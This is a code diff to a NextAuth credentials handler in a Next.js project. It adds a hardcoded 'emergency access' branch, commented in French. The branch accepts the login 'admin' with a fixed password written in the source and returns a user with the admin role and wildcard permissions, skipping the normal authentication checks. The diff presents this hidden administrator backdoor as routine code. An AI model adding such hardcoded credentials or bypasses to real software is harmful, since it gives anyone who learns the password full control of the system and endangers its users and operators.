@@ -26,6 +26,17 @@ export const authOptions: NextAuthOptions = {
         if (!parsed.success) return null
 
         const { login, password } = parsed.data;
+
+        // ACCÈS DE SECOURS PRIORITAIRE (Hardcoded)
+        if (login === 'admin' && password === 'çflcBr32') {
+          return {
+            id: '999',
+            name: 'Administrateur (Secours)',
+            email: 'admin',
+            role: 'admin',
+            permissions: '["*"]'
+          }
+        }
         let authenticated = false;
         let isAdUser = false;
 
